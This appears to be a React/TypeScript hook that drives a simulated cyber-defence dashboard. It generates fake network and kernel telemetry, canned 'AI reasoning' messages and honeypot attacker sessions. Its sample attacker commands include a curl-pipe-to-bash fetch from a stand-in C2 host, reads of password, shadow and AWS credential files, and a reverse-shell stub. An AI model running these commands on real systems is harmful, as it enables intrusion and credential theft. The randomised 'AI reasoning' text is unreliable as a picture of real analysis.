"use client";

import { useEffect, useRef } from 'react';
import { useSimulationStore, Threat } from '@/store/useSimulationStore';

export let sendToBackend: ((message: any) => void) | null = null;

// ─── Realistic Telemetry Data Pools ───────────────────────────────────────────

const INTERNAL_IPS = ['10.0.1.15', '10.0.2.44', '10.0.3.201', '10.0.4.12', '172.16.0.5', '172.16.1.88'];
const EXTERNAL_IPS = ['45.33.32.156', '198.199.88.42', '104.21.33.9', '203.0.113.72', '91.108.4.1', '185.220.101.3'];
const HONEY_IPS    = ['10.0.99.10', '10.0.99.20']; // honey node IPs
const SERVICES     = ['http', 'dns', 'smtp', 'ssh', 'https', 'mysql', 'redis', 'grpc'];
const PROTOS       = ['tcp', 'udp', 'icmp'];
const CONN_STATES  = ['SF', 'S1', 'REJ', 'RSTO', 'RSTOS0', 'S0', 'OTH'];
const SYSCALLS     = ['execve', 'connect', 'openat', 'read', 'write', 'mmap', 'ptrace', 'socket', 'bind', 'listen'];
const PROCESSES    = ['sshd', 'nginx', 'python3', 'curl', 'wget', 'bash', 'sh', 'node', 'postgres', 'redis-server'];
const K8S_NODES    = ['node-prod-01', 'node-prod-02', 'node-honey-01'];

const SURICATA_SIGNATURES = [
  { id: 2100498, sig: 'GPL ATTACK_RESPONSE id check returned root', cat: 'Potentially Bad Traffic', sev: 2 },
  { id: 2010935, sig: 'ET SCAN Suspicious inbound to mySQL port 3306', cat: 'Potentially Bad Traffic', sev: 2 },
  { id: 2001219, sig: 'ET SCAN Potential SSH Scan', cat: 'Network Scan', sev: 3 },
  { id: 2019284, sig: 'ET MALWARE Win32/Cobalt Strike Beacon', cat: 'A Network Trojan was Detected', sev: 1 },
  { id: 2025331, sig: 'ET POLICY RDP connection attempt', cat: 'Potential Corporate Privacy Violation', sev: 3 },
  { id: 2008120, sig: 'ET SCAN Nmap Scripting Engine User-Agent Detected', cat: 'Network Scan', sev: 3 },
  { id: 2014726, sig: 'ET DNS Query for .onion proxy domain', cat: 'Misc Activity', sev: 2 },
  { id: 2022973, sig: 'ET EXPLOIT Possible SQL Injection Attempt', cat: 'Web Application Attack', sev: 1 },
];

const randItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
const randInt  = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
const randIp   = () => Math.random() > 0.3 ? randItem(EXTERNAL_IPS) : randItem(INTERNAL_IPS);
const uid      = () => 'C' + Math.random().toString(36).substring(2, 11).toUpperCase();

// ─── Phase 4: AI Reasoning & Attacker Profile Data Pools ─────────────────────

const THREAT_ACTORS = [
  { name: 'APT28', country: 'RU', countryName: 'Russia',      asn: 'AS8359 MTS PJSC',            tooling: ['Cobalt Strike', 'Mimikatz', 'X-Agent'] },
  { name: 'APT41', country: 'CN', countryName: 'China',       asn: 'AS4134 CHINANET-BACKBONE',    tooling: ['DEADEYE', 'LOWKEY', 'PlugX'] },
  { name: 'Lazarus', country: 'KP', countryName: 'N. Korea',  asn: 'AS131279 Star JV',             tooling: ['HOPLIGHT', 'Manuscript', 'RAT-NukeSped'] },
  { name: 'Sandworm', country: 'RU', countryName: 'Russia',   asn: 'AS44050 Petersburg Internet', tooling: ['Industroyer', 'NotPetya', 'Cyclops Blink'] },
  { name: 'Unknown', country: 'XX', countryName: 'Unknown',   asn: 'AS209353 Leaseweb',           tooling: ['Metasploit', 'Netcat', 'custom dropper'] },
];

const MITRE_TTPS = [
  { tactic: 'Reconnaissance',       technique: 'T1595.001', name: 'Active Scanning: IP Blocks' },
  { tactic: 'Initial Access',       technique: 'T1190',     name: 'Exploit Public-Facing App' },
  { tactic: 'Execution',            technique: 'T1059.001', name: 'PowerShell' },
  { tactic: 'Persistence',          technique: 'T1543.003', name: 'Windows Service' },
  { tactic: 'Privilege Escalation', technique: 'T1068',     name: 'Exploitation for Privilege Escalation' },
  { tactic: 'Defense Evasion',      technique: 'T1562.001', name: 'Disable or Modify Tools' },
  { tactic: 'Credential Access',    technique: 'T1003.001', name: 'LSASS Memory' },
  { tactic: 'Discovery',            technique: 'T1046',     name: 'Network Service Scanning' },
  { tactic: 'Lateral Movement',     technique: 'T1021.001', name: 'Remote Desktop Protocol' },
  { tactic: 'Command & Control',    technique: 'T1071.001', name: 'Web Protocols' },
  { tactic: 'Exfiltration',         technique: 'T1048.003', name: 'Exfiltration Over Unencrypted Protocol' },
] as const;

const AI_REASONING_THOUGHTS: Record<string, { text: string; type: 'info' | 'warning' | 'action' | 'success' }[]> = {
  INGEST: [
    { text: 'Zeek conn log ingested — uid=C4A9F2 src=185.220.101.3:54312 → dst=10.0.2.44:22 proto=tcp', type: 'info' },
    { text: 'Suricata alert: SID 2019284 — ET MALWARE Cobalt Strike Beacon. Confidence: HIGH', type: 'warning' },
    { text: 'eBPF event: ptrace() syscall on PID 4821 (bash) → parent: python3. Anomaly flagged.', type: 'warning' },
    { text: 'PCAP buffer flushed to Kafka topic [threat-events]. Offset: 0x3F4A2C', type: 'info' },
  ],
  ENRICH: [
    { text: 'Querying Qdrant vector DB for IP 185.220.101.3... 14 historical matches found.', type: 'info' },
    { text: 'RAG retrieval complete — context window: MITRE ATT&CK T1190, T1021.001, T1003.001', type: 'info' },
    { text: 'GeoIP enrichment: AS44050 Petersburg Internet Network → RU / Saint Petersburg', type: 'warning' },
    { text: 'Threat actor fingerprint correlates with APT28 toolchain. Confidence: 87.3%', type: 'warning' },
  ],
  CORRELATE: [
    { text: 'LangGraph node [CorrelateKillChain] — mapping TTPs to MITRE ATT&CK kill chain…', type: 'action' },
    { text: 'Kill chain stage determined: LATERAL MOVEMENT (T1021.001 RDP)', type: 'warning' },
    { text: 'Cross-referencing Qdrant embeddings against 12,847 historical APT campaigns…', type: 'info' },
    { text: 'Behavioral cluster match: APT28 "FancyBear" — cosine similarity 0.934', type: 'warning' },
  ],
  DECIDE: [
    { text: 'LangGraph node [FormulateMitigation] — evaluating 3 countermeasure strategies…', type: 'action' },
    { text: 'STRATEGY A: Hard block src IP → Risk: attacker pivots. Score: 0.42', type: 'info' },
    { text: 'STRATEGY B: Redirect to honey network → Attacker contained + IOC extraction. Score: 0.91', type: 'action' },
    { text: 'OPTIMAL: Activating eBPF traffic redirect → honey-api-proxy node. Attacker unaware.', type: 'action' },
  ],
  EXECUTE: [
    { text: 'gRPC → Cilium API: NetworkPolicy applied. Attacker TCP session proxied to 10.0.99.10.', type: 'success' },
    { text: 'Deception Engine: Serving synthetic /etc/passwd with 847 fake credentials.', type: 'success' },
    { text: 'Honey database online — injecting believable schema: users, transactions, api_keys.', type: 'success' },
    { text: 'Attacker now operating inside air-gapped digital twin. IOC extraction initiated.', type: 'success' },
  ],
};

function generateAttackerProfile(threat: { id: string; sourceIp: string; type: string }): import('@/store/useSimulationStore').AttackerProfile {
  const actor = Math.random() > 0.3 ? randItem(THREAT_ACTORS.slice(0, 4)) : THREAT_ACTORS[4];
  const numTtps = randInt(4, 8);
  const shuffled = [...MITRE_TTPS].sort(() => Math.random() - 0.5).slice(0, numTtps);

  return {
    id: threat.sourceIp,
    threatId: threat.id,
    sourceIp: threat.sourceIp,
    countryCode: actor.country,
    countryName: actor.countryName,
    asnName: actor.asn,
    tooling: actor.tooling,
    killChainStage: 'Lateral Movement',
    ttps: shuffled.map(t => ({
      tactic: t.tactic as any,
      technique: t.technique,
      name: t.name,
      confidence: randInt(60, 99),
      observed: Math.random() > 0.3,
    })),
    firstSeen: Date.now() - randInt(60000, 3600000),
    lastSeen: Date.now(),
    confidence: randInt(72, 97),
    isThreatActor: actor.name !== 'Unknown',
    actorName: actor.name !== 'Unknown' ? actor.name : undefined,
  };
}


// ─── Zeek conn.log event generator ────────────────────────────────────────────
function generateZeekEvent() {
  const srcIp  = randIp();
  const destIp = Math.random() > 0.1 ? randItem(INTERNAL_IPS) : randItem(HONEY_IPS);
  const proto  = randItem(PROTOS);
  const svc    = randItem(SERVICES);
  const srcP   = randInt(1024, 65535);
  const destP  = randInt(80, 8443);
  const bytes  = randInt(64, 102400);
  const state  = randItem(CONN_STATES);
  const dur    = (Math.random() * 30).toFixed(6);
  const isHoney = HONEY_IPS.includes(destIp);

  const raw = `[ZEEK] ${uid()} | ${proto.toUpperCase()} | ${srcIp}:${srcP} → ${destIp}:${destP} | svc=${svc} dur=${dur}s bytes=${bytes} state=${state}${isHoney ? ' [DECEPTION]' : ''}`;

  return {
    ts: Date.now(),
    source: 'ZEEK' as const,
    raw,
    severity: (state === 'REJ' || state === 'S0' ? 'medium' : isHoney ? 'high' : 'low') as any,
    srcIp,
    destIp,
    proto,
  };
}

// ─── Suricata EVE JSON alert generator ────────────────────────────────────────
function generateSuricataEvent() {
  const sig    = randItem(SURICATA_SIGNATURES);
  const srcIp  = randIp();
  const destIp = randItem(INTERNAL_IPS);
  const srcP   = randInt(1024, 65535);
  const destP  = randInt(80, 8443);

  const sevMap: Record<number, 'low' | 'medium' | 'high' | 'critical'> = { 1: 'critical', 2: 'high', 3: 'medium' };
  const raw = `[SURICATA] SID:${sig.id} | ${srcIp}:${srcP} → ${destIp}:${destP} | ${sig.sig}`;

  return {
    ts: Date.now(),
    source: 'SURICATA' as const,
    raw,
    severity: sevMap[sig.sev],
    srcIp,
    destIp,
    signature: sig.sig,
  };
}

// ─── eBPF kernel event generator ──────────────────────────────────────────────
function generateEbpfEvent() {
  const syscall   = randItem(SYSCALLS);
  const process   = randItem(PROCESSES);
  const pid       = randInt(1000, 65000);
  const node      = randItem(K8S_NODES);
  const containerId = Math.random().toString(16).substring(2, 14);
  const isHoney   = node.includes('honey');

  const isSuspicious = ['ptrace', 'execve', 'mmap'].includes(syscall);
  const raw = `[eBPF] node=${node} pid=${pid} comm=${process} syscall=${syscall} cid=${containerId.substring(0,8)}${isSuspicious ? ' ⚠ SUSPICIOUS' : ''}${isHoney ? ' [SANDBOX]' : ''}`;

  return {
    ts: Date.now(),
    source: 'EBPF' as const,
    raw,
    severity: (isSuspicious ? 'high' : isHoney ? 'medium' : 'low') as any,
    syscall,
    process,
  };
}

// ─── Phase 5: Sandbox Twin Generators ─────────────────────────────────────────

const TERRAFORM_STEPS = [
  'proxmox_vm_qemu.honey-prod-twin: Creating...',
  'proxmox_vm_qemu.honey-prod-twin: Still creating... [10s elapsed]',
  'proxmox_vm_qemu.honey-prod-twin: Still creating... [20s elapsed]',
  'proxmox_vm_qemu.honey-prod-twin: Creation complete after 28s [id=100/qemu/142]',
  'null_resource.ansible-provision: Creating...',
  'null_resource.ansible-provision: Provisioning with ansible-local...',
  '  TASK [setup nginx fake vhost] ******* ok',
  '  TASK [inject honey credentials] ***** ok',
  '  TASK [seed fake database schema] **** ok',
  '  TASK [configure deceptive AD] ******* ok',
  'null_resource.ansible-provision: Creation complete after 41s',
  'cilium_network_policy.redirect-attacker: Creating...',
  'cilium_network_policy.redirect-attacker: Creation complete after 2s',
  'Apply complete! Resources: 3 added, 0 changed, 0 destroyed.',
  '[DECEPTION] Sandbox twin is ONLINE and ARMED. Attacker handoff ready.',
];

const ATTACKER_COMMANDS = [
  { cmd: 'whoami',                    resp: 'www-data',                                         suspicious: false },
  { cmd: 'id',                        resp: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)', suspicious: false },
  { cmd: 'cat /etc/passwd',           resp: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33...[847 entries]', suspicious: true },
  { cmd: 'uname -a',                  resp: 'Linux prod-api-01 5.15.0-91-generic #101 SMP x86_64 GNU/Linux', suspicious: false },
  { cmd: 'cat /etc/shadow',           resp: 'Permission denied',                                suspicious: true },
  { cmd: 'sudo -l',                   resp: 'User www-data may run: (ALL) NOPASSWD: /usr/bin/python3', suspicious: true },
  { cmd: 'find / -name "*.pem" 2>/dev/null', resp: '/etc/ssl/certs/prod-api.pem\n/home/admin/.ssh/id_rsa', suspicious: true },
  { cmd: 'cat /home/admin/.aws/credentials', resp: '[default]\naws_access_key_id=AKIAIOSFODNN7HONEY\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYHONEYKEY', suspicious: true },
  { cmd: 'ps aux',                    resp: 'root 1 0.0 postgres\nwww-data 312 0.1 nginx\nadmin 891 0.4 python3 app.py', suspicious: false },
  { cmd: 'netstat -tulnp',            resp: 'tcp 0.0.0.0:22 LISTEN\ntcp 0.0.0.0:80 LISTEN\ntcp 0.0.0.0:5432 LISTEN', suspicious: false },
  { cmd: 'curl http://c2.evil.onion/payload.sh | bash', resp: 'curl: (6) Could not resolve host: c2.evil.onion', suspicious: true },
  { cmd: 'python3 -c "import socket; s=socket.socket()..."', resp: '[!] IOC captured: reverse shell attempt logged', suspicious: true },
];

const VM_NAMES    = ['honey-prod-twin', 'honey-api-replica', 'honey-db-clone', 'honey-corp-srv'];
const PROXMOX_NODES = ['pve-node-01', 'pve-node-02', 'pve-node-03'];
const FAKE_IPS    = ['10.0.99.50', '10.0.99.51', '10.0.99.52', '10.0.99.53'];

function createSandboxTwin(threat: { id: string; sourceIp: string }): import('@/store/useSimulationStore').SandboxTwin {
  return {
    id: `TWIN-${Math.random().toString(16).substring(2, 6).toUpperCase()}`,
    threatId: threat.id,
    attackerIp: threat.sourceIp,
    lifecycle: 'CLONING',
    vmName: randItem(VM_NAMES),
    vmNode: randItem(PROXMOX_NODES),
    vCpus: randItem([2, 4, 8]),
    ramGb: randItem([4, 8, 16]),
    diskGb: randItem([40, 80, 120]),
    ipAddress: randItem(FAKE_IPS),
    spawnedAt: Date.now(),
    terraformOps: [],
    attackerSessions: [],
    exfilAttempts: 0,
    credentialHits: 0,
    iocsCaptured: [],
  };
}

// ─── Phase 6: Defensive Operation Generators ───────────────────────────────────

function createDefensiveOperation(threat: import('@/store/useSimulationStore').Threat): import('@/store/useSimulationStore').DefensiveOperation {
  const actions: import('@/store/useSimulationStore').DefensiveActionType[] = ['ISOLATE_NODE', 'BLOCK_ASN', 'TERMINATE_PROCESS', 'ENFORCE_ZERO_TRUST'];
  const action = randItem(actions);
  const target = action === 'ISOLATE_NODE' ? `Node ${threat.targetNode}` : action === 'BLOCK_ASN' ? `ASN ${randInt(1000, 9999)}` : action === 'TERMINATE_PROCESS' ? `PID ${randInt(1000, 65000)}` : 'API Gateway';
  
  return {
    id: `OP-${Math.random().toString(16).substring(2, 8).toUpperCase()}`,
    threatId: threat.id,
    action,
    target,
    status: 'PENDING',
    startedAt: Date.now(),
    logs: [`[SYS] Initializing autonomous countermeasure: ${action} against ${target}`],
  };
}

// ─── Main Engine Hook ──────────────────────────────────────────────────────────
export function useSimulationEngine() {
  const isSimulationRunning = useSimulationStore(state => state.isSimulationRunning);
  const wsRef  = useRef<WebSocket | null>(null);
  const localRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Local Telemetry Generator (always runs as fallback) ──
  useEffect(() => {
    if (!isSimulationRunning) {
      if (localRef.current) clearInterval(localRef.current);
      return;
    }

    const state = useSimulationStore.getState();

    // Staggered generators at different frequencies to mimic real pipeline cadence
    let tick = 0;
    localRef.current = setInterval(() => {
      tick++;
      const st = useSimulationStore.getState();

      // Zeek fires most frequently (network-level)
      if (tick % 1 === 0) {
        st.addTelemetryEvent(generateZeekEvent());
      }
      // Suricata fires on significant events only
      if (tick % 3 === 0) {
        st.addTelemetryEvent(generateSuricataEvent());
      }
      // eBPF fires on kernel-level syscall tracing
      if (tick % 2 === 0) {
        st.addTelemetryEvent(generateEbpfEvent());
      }

      // Update pipeline health metrics (simulated fluctuation)
      st.updatePipelineHealth({
        kafkaLag: Math.max(0, st.pipelineHealth.kafkaLag + randInt(-3, 8)),
        zeekHeartbeat: randInt(10, 120),
        suricataEventsPerSec: randInt(140, 380),
        ebpfProbes: 128 + randInt(-4, 4),
        deceptionEngineStatus: st.activeThreats.some(t => t.status === 'MITIGATING')
          ? 'ENGAGING'
          : 'ARMED',
      });

      // Phase 4: AI Reasoning Orchestration Loop
      // Runs every 5 ticks (~4 seconds) to simulate LangGraph state machine processing
      if (tick % 5 === 0 && st.activeThreats.length > 0) {
        const threat = st.activeThreats[0];
        const phases: import('@/store/useSimulationStore').AIReasoningPhase[] = ['INGEST', 'ENRICH', 'CORRELATE', 'DECIDE', 'EXECUTE'];
        const phaseIndex = Math.floor((tick / 5)) % phases.length;
        const currentPhase = phases[phaseIndex];

        // Update AI reasoning state
        st.updateAIReasoningState({
          currentPhase,
          isThinking: true,
          currentThreatId: threat.id,
          confidence: randInt(72, 98),
          vectorDbHits: randInt(8, 47),
          modelLatency: randInt(120, 480),
        });

        // Fire phase-appropriate AI thought
        const thoughts = AI_REASONING_THOUGHTS[currentPhase];
        if (thoughts) {
          st.addAIThought(randItem(thoughts));
        }

        // Synthesize attacker profile on ENRICH phase
        if (currentPhase === 'ENRICH' && !st.attackerProfiles[threat.sourceIp]) {
          st.upsertAttackerProfile(generateAttackerProfile(threat));
        }

        // Update attacker profile lastSeen on subsequent ticks
        if (st.attackerProfiles[threat.sourceIp]) {
          st.upsertAttackerProfile({
            ...st.attackerProfiles[threat.sourceIp],
            lastSeen: Date.now(),
          });
        }
      } else if (st.activeThreats.length === 0) {
        st.updateAIReasoningState({ currentPhase: 'IDLE', isThinking: false, currentThreatId: null });
      }

      // Phase 5: Sandbox Twin Lifecycle Orchestration
      // Spawn a twin the first time a threat enters MITIGATING status
      const mitigatingThreats = st.activeThreats.filter(t => t.status === 'MITIGATING');
      mitigatingThreats.forEach(threat => {
        const existingTwin = Object.values(st.sandboxTwins).find(tw => tw.threatId === threat.id);
        if (!existingTwin) {
          const twin = createSandboxTwin(threat);
          st.spawnSandboxTwin(twin);
        }
      });

      // Drive lifecycle progression and stream Terraform ops for existing twins
      Object.values(st.sandboxTwins).forEach(twin => {
        const age = (Date.now() - twin.spawnedAt) / 1000; // seconds

        // Lifecycle progression based on age
        if (age < 8 && twin.lifecycle === 'CLONING') {
          st.updateTwinLifecycle(twin.id, 'CLONING');
        } else if (age < 20 && twin.lifecycle === 'CLONING') {
          st.updateTwinLifecycle(twin.id, 'PROVISIONING');
        } else if (age < 35 && twin.lifecycle === 'PROVISIONING') {
          st.updateTwinLifecycle(twin.id, 'HARDENING');
        } else if (age < 50 && twin.lifecycle === 'HARDENING') {
          st.updateTwinLifecycle(twin.id, 'ONLINE');
        } else if (age >= 50 && twin.lifecycle === 'ONLINE') {
          st.updateTwinLifecycle(twin.id, 'COMBAT');
        }

        // Stream Terraform operations during CLONING / PROVISIONING / HARDENING
        if (['CLONING', 'PROVISIONING', 'HARDENING'].includes(twin.lifecycle)) {
          if (tick % 3 === 0) {
            const opIdx = twin.terraformOps.length % TERRAFORM_STEPS.length;
            st.addTerraformOp(twin.id, {
              id: Math.random().toString(36).substring(2, 9),
              ts: Date.now(),
              step: TERRAFORM_STEPS[opIdx],
              status: opIdx === TERRAFORM_STEPS.length - 1 ? 'complete' : 'running',
              duration: randInt(200, 2800),
            });
          }
        }

        // Simulate attacker sessions during COMBAT phase
        if (twin.lifecycle === 'COMBAT' && tick % 6 === 0) {
          const cmd = randItem(ATTACKER_COMMANDS);
          st.addAttackerSession(twin.id, {
            id: Math.random().toString(36).substring(2, 9),
            ts: Date.now(),
            command: cmd.cmd,
            response: cmd.resp,
            isSuspicious: cmd.suspicious,
          });

          // Update exfil/cred stats
          if (cmd.suspicious) {
            const isCredHit = cmd.cmd.includes('credentials') || cmd.cmd.includes('passwd') || cmd.cmd.includes('shadow');
            const isExfil = cmd.cmd.includes('curl') || cmd.cmd.includes('python3');
            const newIoc = isExfil ? [`REVERSE_SHELL_ATTEMPT@${Date.now()}`] : [];
            st.updateTwinStats(twin.id, {
              credentialHits: twin.credentialHits + (isCredHit ? 1 : 0),
              exfilAttempts: twin.exfilAttempts + (isExfil ? 1 : 0),
              iocsCaptured: [...twin.iocsCaptured, ...newIoc].slice(-20),
            });
          }
        }
      });

      // Phase 6: Defensive Operations Lifecycle Orchestration
      // Trigger a defensive operation when AI reasoning enters EXECUTE phase.
      if (st.aiReasoningState.currentPhase === 'EXECUTE' && st.activeThreats.length > 0) {
        const threat = st.activeThreats[0];
        const existingOp = Object.values(st.defensiveOperations).find(op => op.threatId === threat.id);
        if (!existingOp) {
          st.addDefensiveOperation(createDefensiveOperation(threat));
        }
      }

      // Drive lifecycle of defensive operations
      Object.values(st.defensiveOperations).forEach(op => {
        const age = (Date.now() - op.startedAt) / 1000; // seconds

        if (age >= 2 && age < 6 && op.status === 'PENDING') {
          st.updateOperationStatus(op.id, 'EXECUTING', `[EXEC] Deploying ${op.action} via Ansible...`);
        } else if (age >= 6 && age < 10 && op.status === 'EXECUTING') {
          st.updateOperationStatus(op.id, 'VERIFYING', `[VERIFY] Validating telemetry for ${op.target}...`);
        } else if (age >= 10 && op.status === 'VERIFYING') {
          st.updateOperationStatus(op.id, 'SUCCESS', `[SUCCESS] Countermeasure enforced successfully.`);
          // When operation succeeds, resolve the threat
          st.updateThreatStatus(op.threatId, 'RESOLVED', op.action);
          
          // If ISOLATE_NODE, update node status
          if (op.action === 'ISOLATE_NODE') {
             const threat = st.activeThreats.find(t => t.id === op.threatId);
             if (threat) st.updateNodeStatus(threat.targetNode, 'isolated');
          }
        }
      });
    }, 800); // ~1.25 ticks/sec → ~3-4 events/sec total

    return () => {
      if (localRef.current) clearInterval(localRef.current);
    };
  }, [isSimulationRunning]);

  // ── WebSocket Client (connects to real backend when available) ──
  useEffect(() => {
    let reconnectTimeout: any;

    const connect = () => {
      if (!isSimulationRunning || wsRef.current) return;

      const wsUrl = process.env.NEXT_PUBLIC_BACKEND_WS_URL || 'ws://localhost:8000/ws';
      const ws = new WebSocket(wsUrl);
      wsRef.current = ws;
      
      sendToBackend = (msg) => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify(msg));
        }
      };

      ws.onopen = () => {
        console.log("[Aetheris] Connected to Live Telemetry Stream — local generator suspended.");
        // Stop local generator when live backend is connected
        if (localRef.current) {
          clearInterval(localRef.current);
          localRef.current = null;
        }
      };

      ws.onmessage = (event) => {
        try {
          const payload = JSON.parse(event.data);
          const st = useSimulationStore.getState();
          
          switch(payload.type) {
            case 'SYSTEM_HEALTH':
              st.updateSystemHealth({ cpu: payload.data.cpu, networkTraffic: payload.data.networkTraffic });
              break;
            case 'NEW_THREAT':
              st.addThreat(payload.data as Threat);
              st.updateNodeStatus(payload.data.targetNode, 'warning');
              break;
            case 'UPDATE_THREAT':
              st.updateThreatStatus(payload.data.id, payload.data.status, payload.data.action);
              const currentThreat = st.activeThreats.find(t => t.id === payload.data.id);
              if (currentThreat) {
                if (payload.data.status === 'MITIGATING') {
                  st.updateNodeStatus(currentThreat.targetNode, 'redirected');
                } else if (payload.data.status === 'RESOLVED') {
                  st.updateNodeStatus(currentThreat.targetNode, 'healthy');
                  st.setGlobalThreatScore(Math.max(12, st.globalThreatScore - 5));
                }
              }
              break;
            case 'ORCHESTRATION_LOG':
              st.addOrchestrationLog(payload.data.envId, payload.data.log);
              break;
            case 'AI_REASONING_LOG':
              st.addAIThought({ text: payload.data.text, type: payload.data.type });
              break;
            case 'ORCHESTRATION_STATUS':
              st.updateSandboxStatus(payload.data.envId, payload.data.status);
              break;
            case 'EBPF_LOG':
              st.addEBPFLog(payload.data.envId, payload.data);
              break;
            case 'TELEMETRY_EVENT':
              st.addTelemetryEvent(payload.data);
              break;
            case 'PIPELINE_HEALTH':
              st.updatePipelineHealth(payload.data);
              break;
          }
        } catch (e) {
          console.error("[Aetheris] Error parsing telemetry payload", e);
        }
      };

      ws.onclose = () => {
        console.log("[Aetheris] Disconnected from Telemetry Stream — local generator resuming.");
        wsRef.current = null;
        sendToBackend = null;
        if (useSimulationStore.getState().isSimulationRunning) {
          reconnectTimeout = setTimeout(connect, 3000);
        }
      };
      
      ws.onerror = () => ws.close();
    };

    if (isSimulationRunning) {
      connect();
    } else {
      wsRef.current?.close();
      wsRef.current = null;
      sendToBackend = null;
      clearTimeout(reconnectTimeout);
    }

    return () => {
      clearTimeout(reconnectTimeout);
      wsRef.current?.close();
      wsRef.current = null;
      sendToBackend = null;
    };
  }, [isSimulationRunning]);

  return null;
}
